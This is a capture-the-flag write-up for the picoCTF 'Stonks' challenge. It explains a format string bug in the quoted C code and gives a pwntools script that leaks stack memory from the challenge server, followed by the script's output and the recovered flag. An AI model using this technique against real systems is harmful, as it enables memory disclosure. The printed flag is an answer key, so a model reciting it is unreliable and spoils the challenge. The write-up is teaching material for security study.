# Stonks
## Category - Binary Exploitation
## Author - MADSTACKS

### Description: 
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 59616

### Solution:
The challenge gives us a link to download the source code for the challenge as well as a netcat command we can use to actually run the challenge binary. Looking at the source code
we see that it is vulnerable to a format string vulnerability because of this segment of code in the buy_stonks() function:
```c
  char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```
As it uses the printf() function to print out whatever we input here we can input a format string such as %s to leak strings in memory. In addition to this, thanks to the beauty
of format strings we can use direct format strings such as "%n$s" to leak a particular string in memory where n is the nth string to take from memory. You can replace this with
any integer value to leak specific strings. For this challenge however we must use %p format strings to leak pointers as the flag is not stored as a direct string in memory. Simply
writing a script that loops through all possible direct format strings and reads the result should do the trick. Unfortunately, however, the endiannes of the resulting strings is 
reversed from what we want it to be so we must reverse the endiannes before getting parts of the flag. Below is the script I wrote for this challenge. After running it for just a bit
you will begin to see parts of the flag pop up:
```python
from pwn import *
import sys
import codecs

f = open("stonksdump.txt", "a")

for i in range(1, 100):
    r = remote('mercury.picoctf.net', 59616)
    r.sendlineafter("2) View my portfolio", "1")
    r.sendlineafter("What is your API token?", '%{}$p'.format(i))
    r.recvline()
    r.recvline()
    leak = r.recvline()
    data = leak.strip()[2:]
    print i
    print data
    if 'il' not in data:
        if len(data)%2 == 0:
            newdat = codecs.encode(codecs.decode(data, 'hex')[::-1], 'hex').decode()
            f.write(str(i) + ": " + newdat.strip().decode("hex") + '\n')
            print(str(i) + ": " + newdat.strip().decode("hex") + '\n')
        else:
            f.write(str(i) + ": " + leak.strip() + '\n')
            print(str(i) + ": " + leak.strip() + '\n')
    r.close()
```
Sample output after running the script:
```
zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/BinaryExploitation$ python2 stonkssolver.py
[+] Opening connection to mercury.picoctf.net on port 59616: Done
1
833b3f0
1: 0x833b3f0

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
2
804b000
2: 0x804b000

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
3
80489c3
3: 0x80489c3

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
4
f7f50d80
4: \x80

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
5
ffffffff
5: \xff\xff\xff\xff

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
6
1
6: 0x1

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
7
835d160
7: 0x835d160

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
8
f7f26110
8: \x10

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
9
f7ee4dc7
9: M

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
10
il)
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
11
9140180
11: 0x9140180

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
12
1
12: 0x1

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
13
8b59370
13: 0x8b59370

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
14
9840390
14: 0x9840390

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
15
6f636970
15: pico

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
16
7b465443
16: CTF{

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
17
306c5f49
17: I_l0

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
18
345f7435
18: 5t_4

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
19
6d5f6c6c
19: ll_m

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
20
306d5f79
20: y_m0

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
21
5f79336e
21: n3y_

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
22
38343136
22: 6148

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
23
34356562
23: be54

[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
24
ffc9007d
24: }\x00\xff
```

### Flag:
```
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
```
